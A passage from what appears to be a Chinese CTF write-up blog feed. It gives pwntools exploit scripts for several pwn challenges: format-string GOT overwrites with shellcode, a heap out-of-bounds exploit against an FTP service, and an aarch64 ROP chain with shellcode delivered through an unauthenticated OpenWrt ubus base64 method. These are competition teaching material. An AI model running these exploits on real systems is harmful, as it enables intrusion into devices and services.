class="hljs-string">&#x27;Give me : &#x27;</span>,<span class="hljs-built_in">bytes</span>(i))<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Wrong&#x27;</span> <span class="hljs-keyword">in</span> p.recv(<span class="hljs-number">5</span>):<br>            game(<span class="hljs-built_in">round</span>-j)<br>            <span class="hljs-keyword">return</span><br><br>    p.sendlineafter(<span class="hljs-string">&#x27;Give me : &#x27;</span>,<span class="hljs-string">&#x27;123&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ext_back</span>(<span class="hljs-params">num</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;need : &#x27;</span>,<span class="hljs-built_in">str</span>(num))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;purchase&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.readuntil(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    data=p.readuntil(<span class="hljs-string">&#x27;Backpack size&#x27;</span>,drop=<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">use</span>():<br>    p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">format</span>(<span class="hljs-params">data</span>):<br>    buy(data)<br>    res=show()<br>    <span class="hljs-built_in">print</span>(data)<br><span class="hljs-comment">#    print(res)</span><br>    <span class="hljs-keyword">return</span> res<br><br><br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.binary=e<br>func=<span class="hljs-string">&#x27;puts&#x27;</span><br>func_got=e.got[func]<br>func1=<span class="hljs-string">&#x27;printf&#x27;</span><br>func1_got=e.got[func1]<br>exit=e.got[<span class="hljs-string">&#x27;exit&#x27;</span>]<br>lib_i=<span class="hljs-number">11</span><br>src_p=<span class="hljs-number">29</span><br>src=<span class="hljs-number">43</span><br><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv)==<span class="hljs-number">1</span>:<br>    p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>    gdb.attach(p,<span class="hljs-string">&#x27;bp 0x401501&#x27;</span>)<br>    pause()<br><span class="hljs-keyword">else</span>:<br>    p=remote(sys.argv[<span class="hljs-number">1</span>],sys.argv[<span class="hljs-number">2</span>])<br>    <br>game(<span class="hljs-number">80</span>)<br>ext_back(<span class="hljs-number">512</span>)<br><br>pause()<br><br>buy(<span class="hljs-string">f&quot;%<span class="hljs-subst">&#123;lib_i&#125;</span>$p %<span class="hljs-subst">&#123;src_p&#125;</span>$p %<span class="hljs-subst">&#123;src&#125;</span>$p&quot;</span>)<br>d=show().split(<span class="hljs-string">b&#x27; &#x27;</span>)<br>libc_start_main=<span class="hljs-built_in">int</span>(d[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>)<br>src_a=<span class="hljs-built_in">int</span>(d[<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&quot;libc_start_main : &quot;</span>+<span class="hljs-built_in">hex</span>(libc_start_main))<br>success(<span class="hljs-string">&quot;sour_add : &quot;</span>+<span class="hljs-built_in">hex</span>(src_a))<br>src_2=src+<span class="hljs-number">1</span><br>src_3=src+<span class="hljs-number">2</span><br><br>src_a_=(src_a+<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xffff</span><br><span class="hljs-built_in">format</span>(<span class="hljs-string">f&quot;%<span class="hljs-subst">&#123;src_a_&#125;</span>c%<span class="hljs-subst">&#123;src_p&#125;</span>$hn&quot;</span>)<br><br>pause()<br>bss=bssfmt(<span class="hljs-built_in">format</span>)<br>bss.fmt_edit(p64(exit),src_p,src,src_a_)<br><br>bss.fmt_edit(p64(<span class="hljs-number">0x401501</span>),src,src_2,exit)<br><br>shellcode=asm(shellcraft.sh())<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;shellcode&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(shellcode)<br>f.close()<br><span class="hljs-keyword">import</span> os<br>payload=os.popen(<span class="hljs-string">&#x27;alpha x64 ascii mixedcase rax --input=&quot;./shellcode&quot;&#x27;</span>).read()<br><br>buy(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x20</span>+payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="sigin-shellcode">sigin_shellcode</h3><p>在<code>useful_tools</code>中已经将<code>a0寄存器</code>设置为指向<code>&quot;/bin/sh&quot;</code>的指针了,并且已经将<code>shellcode</code>中的后八位设置为执行<code>execve系统调用</code>的代码了,不过<code>a1</code>与<code>a2</code>寄存器没有清空,所以这是我们需要做的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>context.binary=e<br>Floor_num=<span class="hljs-number">0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Down</span>():<br>    <span class="hljs-keyword">global</span> Floor_num<br>    p.sendlineafter(<span class="hljs-string">&#x27;Go&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    cdll=CDLL(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>    cdll.srand(<span class="hljs-number">114514</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;want?&#x27;</span>,<span class="hljs-built_in">str</span>(cdll.rand()%<span class="hljs-number">114514</span>%(Floor_num+<span class="hljs-number">1</span>)))<br>    Floor_num+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">addatk</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;Go&gt; \n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br><span class="hljs-comment">#    p.interactive()</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;buy? \n&gt; \n&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br>cmd=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">b *0x401538</span><br><span class="hljs-string">b *0x400bb4</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv)==<span class="hljs-number">3</span>:<br>    p=remote(sys.argv[<span class="hljs-number">1</span>],sys.argv[<span class="hljs-number">2</span>])<br><span class="hljs-keyword">else</span>:<br><br>    p=other_att(<span class="hljs-string">&quot;./pwn&quot;</span>,<span class="hljs-string">&#x27;mipsel&#x27;</span>)<br>    other_gdb(<span class="hljs-string">&quot;4444&quot;</span>,arch=<span class="hljs-string">&#x27;mips&#x27;</span>,cmd=cmd)<br>    context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>    pause()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">99</span>):<br>    Down()  <br>    <span class="hljs-built_in">print</span>(i)<br>p.readuntil(<span class="hljs-string">&#x27;You have coins: &#x27;</span>)<br>coin=<span class="hljs-built_in">int</span>(p.readline())<br><span class="hljs-built_in">print</span>(coin)<br><span class="hljs-comment">#p.interactive()</span><br><span class="hljs-keyword">if</span> coin%<span class="hljs-number">100</span> &lt; (coin-<span class="hljs-number">2551</span>)%<span class="hljs-number">100</span>:<br>    <span class="hljs-keyword">while</span> coin&gt;=<span class="hljs-number">100</span>:<br>        addatk(<span class="hljs-number">1</span>)<br>        coin-=<span class="hljs-number">100</span><br>     <span class="hljs-comment">#   pause()</span><br><span class="hljs-keyword">else</span>:<br>    addatk(<span class="hljs-number">3</span>)<br>    coin-=<span class="hljs-number">2551</span><br>    <span class="hljs-keyword">while</span> coin&gt;=<span class="hljs-number">100</span>:<br>      <span class="hljs-comment">#  pause()</span><br>        addatk(<span class="hljs-number">1</span>)<br>        coin-=<span class="hljs-number">100</span><br>Down()<br><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;li $a1,0</span><br><span class="hljs-string">li $a2,0</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>shell=asm(shellcode)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(shell))<br>p.interactive()<br>p.send(shell)<br>pause()<br><span class="hljs-comment">#p.send(asm(shellcraft.sh()))</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="easy-LzhiFTP">easy_LzhiFTP</h3><p>在<code>touch</code>时存在数组越界,当创建第<code>17</code>个成员时会将第<code>1</code>个成员设置为第<code>17</code>个成员的<code>size</code>,可以做到任意地址读写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;./ftp&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;39.106.65.236 30913&quot;</span>)<br>e=ELF(<span class="hljs-string">&#x27;./ftp&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendlineafter(<span class="hljs-string">&quot;Username: &quot;</span>,<span class="hljs-string">&#x27;rot&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Password: &#x27;</span>,<span class="hljs-string">b&#x27;r\0\0\0&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">touch</span>(<span class="hljs-params">filename</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;FTP&gt; &quot;</span>,<span class="hljs-string">b&quot;touch %s&quot;</span>%filename)<br>    p.sendlineafter(<span class="hljs-string">&quot;Context&quot;</span>,<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;FTP&gt; &#x27;</span>,<span class="hljs-string">b&#x27;edit&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;Content: &#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;FTP&gt; &#x27;</span>,<span class="hljs-string">b&#x27;del&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;No)&#x27;</span>,<span class="hljs-string">b&#x27;No%19$p&#x27;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;Choice:No&#x27;</span>)<br>d=<span class="hljs-built_in">int</span>(p.readline(),<span class="hljs-number">16</span>)<br>e.address=d-<span class="hljs-number">0x1d29</span><br>free_got=e.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system=e.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    touch(<span class="hljs-built_in">str</span>(i).encode())<br><br>free(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#touch(p64(0))</span><br>touch(p64(free_got))<br>edit(<span class="hljs-number">0</span>,p64(system))<br>free(<span class="hljs-number">1</span>)<br><br>p.interactive()<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023年D3CTF-pwn</title>
    <link href="/page/wp/2023%E5%B9%B4D3ctf-pwn/"/>
    <url>/page/wp/2023%E5%B9%B4D3ctf-pwn/</url>
    
    <content type="html"><![CDATA[<h2 id="d3op">d3op</h2><h3 id="预操作">预操作</h3><p>解压附件之后得到三个文件: <code>start.sh</code>,<code>squashfs-root.img</code>,<code>Image</code><br>执行<code>start.sh</code>之后，启动了一个虚拟机，查看<code>/etc/os-release</code>之后发现虚拟机是<code>openwrt 22.03.3</code>版本的固件，架构为<code>armvirt/64</code>,到官网上下载对应版本的文件镜像<code>https://archive.openwrt.org/releases/22.03.3/targets/armvirt/64/openwrt-22.03.3-armvirt-64-rootfs-squashfs.img.gz</code><br>使用 <code>unsquashfs</code> 解压题目里的文件镜像和下载的文件镜像，然后使用<code>color_diff -r squ1 squ2</code>，查看两个文件镜像中的不同</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs diff">diff: sq1/etc/localtime: 没有那个文件或目录<br>diff: sq2/etc/localtime: 没有那个文件或目录<br>diff: sq1/etc/ppp/resolv.conf: 没有那个文件或目录<br>diff: sq2/etc/ppp/resolv.conf: 没有那个文件或目录<br>diff: sq1/etc/resolv.conf: 没有那个文件或目录<br>diff: sq2/etc/resolv.conf: 没有那个文件或目录<br>只在 sq2/dev 存在：console<br>只在 sq1/etc/config 存在：network<br>diff -r sq1/etc/shadow sq2/etc/shadow<br>1c1<br>&lt; root:$6$JlPmKq/ZhqQ0I6V6$B74FL6cufcnZKT4G0sUz3xNP0Pr4k7yOG2I091f2OFOmcldS2s7CPJwOcfx0r/OshYDOFKw76APIqPHBXCdXb/:19442::::::<br><span class="hljs-comment">---</span><br>&gt; root:::0:99999:7:::<br>diff: sq1/etc/TZ: 没有那个文件或目录<br>diff: sq2/etc/TZ: 没有那个文件或目录<br>只在 sq1 存在：flag<br>diff: sq1/sbin/insmod: 没有那个文件或目录<br>diff: sq2/sbin/insmod: 没有那个文件或目录<br>diff: sq1/sbin/lsmod: 没有那个文件或目录<br>diff: sq2/sbin/lsmod: 没有那个文件或目录<br>diff: sq1/sbin/modinfo: 没有那个文件或目录<br>diff: sq2/sbin/modinfo: 没有那个文件或目录<br>diff: sq1/sbin/modprobe: 没有那个文件或目录<br>diff: sq2/sbin/modprobe: 没有那个文件或目录<br>diff: sq1/sbin/rmmod: 没有那个文件或目录<br>diff: sq2/sbin/rmmod: 没有那个文件或目录<br>diff: sq1/usr/bin/scp: 没有那个文件或目录<br>diff: sq2/usr/bin/scp: 没有那个文件或目录<br>diff: sq1/usr/bin/ssh: 没有那个文件或目录<br>diff: sq2/usr/bin/ssh: 没有那个文件或目录<br>diff: sq1/usr/bin/wget: 没有那个文件或目录<br>diff: sq2/usr/bin/wget: 没有那个文件或目录<br>只在 sq1/usr/libexec/rpcd 存在：base64<br>diff -r sq1/usr/share/rpcd/acl.d/unauthenticated.json sq2/usr/share/rpcd/acl.d/unauthenticated.json<br>2,16c2,12<br>&lt;     &quot;unauthenticated&quot;: &#123;<br>&lt;         &quot;description&quot;: &quot;Access controls for unauthenticated requests&quot;,<br>&lt;         &quot;read&quot;: &#123;<br>&lt;             &quot;ubus&quot;: &#123;<br>&lt;                 &quot;session&quot;: [<br>&lt;                     &quot;access&quot;,<br>&lt;                     &quot;login&quot;<br>&lt;                 ],<br>&lt;                 &quot;base64&quot;: [<br>&lt;                     &quot;decode&quot;,<br>&lt;                     &quot;encode&quot;<br>&lt;                 ]<br>&lt;             &#125;<br>&lt;         &#125;<br>&lt;     &#125;<br><span class="hljs-comment">---</span><br>&gt; &quot;unauthenticated&quot;: &#123;<br>&gt; &quot;description&quot;: &quot;Access controls for unauthenticated requests&quot;,<br>&gt; &quot;read&quot;: &#123;<br>&gt; &quot;ubus&quot;: &#123;<br>&gt; &quot;session&quot;: [<br>&gt; &quot;access&quot;,<br>&gt; &quot;login&quot;<br>&gt; ]<br>&gt; &#125;<br>&gt; &#125;<br>&gt; &#125;<br></code></pre></td></tr></table></figure><p>发现在题目中允许未认证访问的<code>ubus</code>接口中多了一个<code>base64</code>方法，同时在<code>/usr/libexec/rpcd</code>中多了一个<code>base64</code>文件,所以猜测无需认证即可访问的<code>ubus</code>中<code>base64</code>方法就是<code>/usr/lib/exec/rpcd/base64</code></p><h3 id="分析base64文件">分析base64文件</h3><p><img src="/img/blog_img/D3CTF/2023_d3ctf_d3op.png" srcset="/img/loading.gif" lazyload alt="关键函数" title="关键函数"></p><p><img src="/img/blog_img/D3CTF/2023_d3ctf_d3op-1.png" srcset="/img/loading.gif" lazyload alt="加解密函数" title="加解密函数"></p><p>经过分析我们发现在<code>base64</code>方法中存在溢出漏洞</p><h3 id="访问">访问</h3><p><a href="https://www.likecs.com/show-307589624.html">关于unauthenticated</a>，在这个文章里面我知道了在<code>unauthenticated</code>中<code>ubus</code>接口可以直接使用<code>http://ip:port/ubus</code>访问，同时知道了访问时应该传入<code>&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:1,&quot;method&quot;:&quot;call&quot;,&quot;params&quot;:[&quot;00000000000000000000000000000000&quot;,&quot;方法&quot;,&quot;方法的行为&quot;,&#123;&quot;参数&quot;:&quot;参数值&quot;&#125;]&#125;'</code></p><p>在<code>/usr/lib/lua/luci/controller/admin/index.lua</code>中存在<code>action_ubus</code>函数，在<code>/usr/share/luci/menu.d/luci-base.json</code>中将<code>action_ubus</code>函数注册为了<code>admin/ubus</code>，可以访问<code>http://ip:port/cgi-bin/luci/admin/ubus</code>来执行<code>action_ubus</code>函数<br>通过分析<code>action_ubus</code>函数发现传入的参数中需要存在<code>jsonrpc</code>且值必须为<code>&quot;2.0&quot;</code>，并且参数中<code>id</code>不能为空,然后<code>method</code>是设置行为，可以是<code>list/call</code>,然后<code>params</code>是一个列表,其中第一个必须是<code>00000000000000000000000000000000</code>，然后就是方法，再是方法的行为，再是方法的行为的参数，整合起来就是一个<code>json</code>格式的字符串<code>&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:1,&quot;method&quot;:&quot;call&quot;,&quot;params&quot;:[&quot;00000000000000000000000000000000&quot;,&quot;方法&quot;,&quot;方法的行为&quot;,&#123;&quot;参数&quot;:&quot;参数值&quot;&#125;]&#125;'</code>，这与搜索到的使用方法是一致的</p><p>既然已知<code>base64</code>方法中存在漏洞，而且触发的方式也知道了就可以直接攻击了，因为是目标是网站，所以不能使用<code>system(&quot;/bin/sh&quot;)</code>的方式获取<code>shell</code>，但可以尝试反弹<code>shell</code>或者直接使用<code>orw</code>获取<code>flag</code></p><h3 id="getflag">getflag</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">需要注意的点有，输出必须是json格式，并且是一个完整的json格式，不能有多的数据导致json解析失败，否则会返回 &#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:1,&quot;result&quot;:[2]&#125;</span><br><span class="hljs-string">然后就是需要保证程序退出是正常退出，否则会返回 &#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:1,&quot;result&quot;:[5]&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> base64<br>e=ELF(<span class="hljs-string">&quot;./base64&quot;</span>)<br>bss=<span class="hljs-number">0x4a2098</span><br>bss_seg=<span class="hljs-number">0x4a2000</span><br>context.binary=e<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    因为aarch64架构的汇编指令中ret指令不会像x86/x86_64架构那样会从栈中获取数据，然后再返回</span><br><span class="hljs-string">    在aarch64架构中ret指令就只是将x30寄存器的值放到pc寄存器中</span><br><span class="hljs-string">    所以找的gadget必须要存在利用栈修改x30寄存器的指令</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>x0=<span class="hljs-number">0x0000000000403c84</span> <span class="hljs-comment"># ldr x0, [sp, #0x38]; ldp x29, x30, [sp], #0x40; ret; </span><br>mprotect=<span class="hljs-number">0x4579a4</span><br><br><br>nop=asm(<span class="hljs-string">&quot;nop&quot;</span>)<br>shellcode=shellcraft.setuid(<span class="hljs-number">0</span>)+shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)+\<br>    <span class="hljs-string">&quot;nop\nnop\nnop\n&quot;</span>+\<br>    shellcraft.read(<span class="hljs-number">3</span>,bss+<span class="hljs-number">14</span>,<span class="hljs-number">100</span>)+\<br>    shellcraft.write(<span class="hljs-number">1</span>,bss,<span class="hljs-number">0x42</span>)+\<br>    shellcraft.exit(<span class="hljs-number">0</span>)<br><br>payload=<span class="hljs-string">b&#x27;&#123;&quot;output&quot;: &quot;&#x27;</span>.ljust(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)+<span class="hljs-string">b&#x27;&quot;&#125;&#x27;</span><br>data=<span class="hljs-built_in">len</span>(payload)<br>payload+=nop*<span class="hljs-number">0x40</span>+asm(shellcode)<br>payload=payload.ljust(<span class="hljs-number">0x418</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)+p32(<span class="hljs-number">0x64b</span>)+p32(<span class="hljs-number">0x41d</span>)+p32(<span class="hljs-number">0x584</span>)+p32(<span class="hljs-number">0x4b8</span>)<br>payload+=p64(<span class="hljs-number">0</span>)+p64(x0)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment">#458</span><br>payload+=p64(<span class="hljs-number">0</span>)+p64(mprotect)+p64(<span class="hljs-number">0</span>)+p64(bss_seg+<span class="hljs-number">0x1000</span>)+p64(bss_seg)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(bss-<span class="hljs-number">0x28</span>)<br>payload+=p64(bss)+p64(bss+data)<br><br>payload=base64.b64encode(payload)<br><br>para=&#123;<span class="hljs-string">&quot;input&quot;</span>:payload.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)&#125;<br>data=&#123;<span class="hljs-string">&quot;jsonrpc&quot;</span>:<span class="hljs-string">&quot;2.0&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-string">&quot;call&quot;</span>,<span class="hljs-string">&quot;params&quot;</span>:[<span class="hljs-string">&quot;00000000000000000000000000000000&quot;</span>,<span class="hljs-string">&quot;base64&quot;</span>,<span class="hljs-string">&quot;decode&quot;</span>,para]&#125;<br><br>url=<span class="hljs-string">&#x27;http://127.0.0.1:4444/ubus&#x27;</span> <br><span class="hljs-comment"># 访问 http://ip:port/cgi-bin/luci/admin/ubus 也是一样的</span><br>r=requests.post(url,headers=&#123;<span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/json&quot;</span>&#125;,data=json.dumps(data))<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023NKCTF-wp</title>
    <link href="/page/wp/NKCTF2023/"/>
    <url>/page/wp/NKCTF2023/</url>
    
